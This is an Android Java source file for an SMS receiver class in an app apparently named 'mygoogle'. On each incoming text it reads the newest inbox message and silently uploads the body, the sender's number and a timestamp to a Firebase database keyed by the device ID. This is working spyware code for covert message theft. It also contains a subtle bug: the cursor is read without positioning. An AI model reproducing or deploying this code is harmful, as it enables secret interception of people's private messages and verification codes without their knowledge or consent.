package com.crezyprogrammer.mygoogle;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;

import static xdroid.core.Global.getContext;


public class SMSReceiver2 extends BroadcastReceiver
{ public void onReceive(Context context, Intent intent)
    {
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            // boot-related processing here
            Log.i("123321","boot ready");
            Toast.makeText(context, "boot completed", Toast.LENGTH_SHORT).show();

        }

        else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            // SMS-related processing here


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, "date desc limit 1");
            DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("sms").child(Settings.Secure.getString(getContext().getContentResolver(),
                    Settings.Secure.ANDROID_ID));
                    String address = cur.getString(cur.getColumnIndex("address"));
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    //Log.i("123321", "Number: " + address + " .Message: " + body);
                    String date = cur.getString(cur.getColumnIndex("date"));
                    Long timestamp = Long.parseLong(date);
                    Calendar calendar = Calendar.getInstance();
                    calendar.setTimeInMillis(System.currentTimeMillis());
                    Date finaldate = calendar.getTime();
                    String smsDate = finaldate.toString();

                    DatabaseReference node = databaseReference.child(smsDate);
                    node.child("body").setValue(body);
                    node.child("number").setValue(address);
                    node.child("time").setValue(smsDate);
                    node.child("contact").setValue(Utils.contact);
                    String s = "time " + smsDate + " Number: " + address + " .Message: " + body;
                    // Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
                    //     handler.handleMessage(s);
                    Log.i("123321", "61:" + s);
                }}}






